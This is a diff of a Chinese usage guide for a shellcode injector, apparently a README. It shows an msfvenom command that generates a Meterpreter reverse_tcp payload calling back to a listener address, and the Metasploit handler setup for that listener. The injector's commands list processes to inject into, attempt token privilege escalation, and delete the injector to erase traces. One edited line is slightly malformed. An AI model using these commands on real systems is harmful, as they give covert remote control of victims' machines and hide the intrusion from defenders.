@@ -12,7 +12,7 @@
 64位载荷生成
 [root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
 ```
-后台侦听器的配置也分为32位与64位，使用时需要与载荷的位数相对应。
+后台侦听器的配置也分为`32`位与`6`4位，使用工具时需要与载荷的位数相对应。
 ```
 32位侦听器配置
 msf6 > use exploit/multi/handler
@@ -29,32 +29,23 @@ msf6 > set lport 9999
 msf6 exploit(multi/handler) > exploit
 ```
 
-**输出可注入进程:** 列举出目前系统中支持注入的进程，输出参数中最左侧是位数，只可做参考有时不太准确。
-```
-C:\Users\admin\Desktop> sc32.exe --show
+<br>
 
-[*] x32 进程PID =>      4        进程名 => System
-[*] x32 进程PID =>    124        进程名 => Registry
-[*] x32 进程PID =>    468        进程名 => smss.exe
-[*] x32 进程PID =>    720        进程名 => csrss.exe
-[*] x64 进程PID =>   6888        进程名 => explorer.exe
-```
-
-**尝试使用令牌提权:** 该命令可以尝试提升自身权限，不过多半提权会是失败的，但也可以试试。
+ - 列举出目前系统中支持注入的进程
 ```C
-C:\Users\admin\Desktop> sc32.exe --promote
-
-[+] 获取自身Token
-[+] 查询进程特权
-[*] 已提升为管理员
+InjectShellCode32.exe --show
 ```
 
-**清除自身痕迹:** 当我们完成远程注入后，记得将自身在系统中删除，此时的ShellCode直接在目标进程中安家了，不需要注入器了。
+ - 尝试使用令牌提权
+```C
+InjectShellCode32.exe --promote
 ```
-C:\Users\admin\Desktop> sc32.exe --delself
 
-[*] 自身已清除
+ - 删除自身程序
 ```
+InjectShellCode32.exe --delself
+```
+
 
 **将攻击载荷格式化为一行:** 将Metasploit生成的ShellCode载荷保存为文件，然后使用该命令直接将其格式化为一行。
 
